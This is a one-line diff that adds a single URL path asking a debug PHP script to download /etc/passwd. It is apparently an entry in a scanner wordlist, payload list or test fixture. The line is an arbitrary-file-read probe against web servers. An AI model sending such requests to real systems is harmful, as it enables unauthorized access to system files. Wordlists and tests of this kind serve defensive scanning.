@@ -1,0 +1,1 @@
+/debug/rproxy_diag.php?action=download&filename=/etc/passwd
